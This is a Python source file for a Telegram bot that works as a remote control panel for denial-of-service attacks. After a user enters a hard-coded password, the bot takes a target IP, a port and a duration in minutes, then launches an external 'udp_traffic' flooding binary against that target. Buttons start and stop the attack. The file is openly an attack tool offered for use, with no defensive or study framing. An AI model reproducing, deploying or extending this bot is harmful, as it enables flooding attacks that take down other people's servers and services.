import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# Store the process for attack control
attack_process = None

# Define the password for authentication
PASSWORD = "YOUCANTHACKMEN00B"

# A dictionary to store authenticated users
authenticated_users = {}

# Start command to welcome the user
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Welcome! Please type /hailgodz to authenticate.")

# /hailgodz command to initiate authentication
def hailgodz(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id

    # Check if the user is already authenticated
    if authenticated_users.get(chat_id):
        update.message.reply_text("You are already authenticated!", reply_markup=main_menu_keyboard())
    else:
        update.message.reply_text("Please provide the password:")

# Handling password response
def password_check(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id
    text = update.message.text

    # Authenticate the user
    if text == PASSWORD:
        authenticated_users[chat_id] = True
        update.message.reply_text("Authenticated! Please choose a command.", reply_markup=main_menu_keyboard())
    else:
        update.message.reply_text("Wrong password! Try again by typing /hailgodz.")

# Main menu with buttons (Attack and Stop)
def main_menu_keyboard():
    keyboard = [[InlineKeyboardButton('Attack', callback_data='attack')],
                [InlineKeyboardButton('STOP', callback_data='stop')]]
    return InlineKeyboardMarkup(keyboard)

# Handling button presses (Attack and Stop)
def button_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    chat_id = query.message.chat_id
    query.answer()

    if query.data == 'attack':
        context.bot.send_message(chat_id=chat_id, text="Send the attack details in the format: IP PORT DURATION (in minutes)")
        context.user_data['awaiting_input'] = True
    elif query.data == 'stop':
        stop_attack(update, context)

# Handling the IP, Port, and Duration input after the attack button is pressed
def handle_input(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id

    if context.user_data.get('awaiting_input'):
        try:
            ip, port, duration = update.message.text.split()
            start_attack(update, context, ip, port, duration)
        except ValueError:
            update.message.reply_text("Please provide the input in the correct format: IP PORT DURATION (in minutes)")
        context.user_data['awaiting_input'] = False

# Function to start the UDP attack (runs the C code)
def start_attack(update: Update, context: CallbackContext, ip, port, duration) -> None:
    global attack_process

    # Convert duration to seconds
    duration_seconds = int(duration) * 60

    try:
        # Start the attack using subprocess (change the path to your executable)
        attack_process = subprocess.Popen(['./udp_traffic', ip, port, str(duration_seconds)])
        update.message.reply_text(f"Attack started on {ip}:{port} for {duration} minutes.")
    except Exception as e:
        update.message.reply_text(f"Failed to start the attack: {str(e)}")

# Function to stop the attack
def stop_attack(update: Update, context: CallbackContext) -> None:
    global attack_process

    if attack_process:
        attack_process.terminate()
        attack_process = None
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="Attack stopped.")
    else:
        context.bot.send_message(chat_id=update.callback_query.message.chat_id, text="No attack is running.")

# Main function to set up the bot
def main() -> None:
    # Your bot token here
    TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'

    updater = Updater(TOKEN)

    dispatcher = updater.dispatcher

    # Command handlers
    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('hailgodz', hailgodz))

    # Message handler for password and attack details
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_authenticated_user))

    # Button press handler
    dispatcher.add_handler(CallbackQueryHandler(button_handler))

    # Start the bot
    updater.start_polling()
    updater.idle()

# Handle user input (Password check or Attack input based on the user status)
def handle_authenticated_user(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id

    # If the user is authenticated, handle their input for attacks
    if authenticated_users.get(chat_id):
        handle_input(update, context)
    else:
        # If not authenticated, check for password input
        password_check(update, context)

if __name__ == '__main__':
    main()
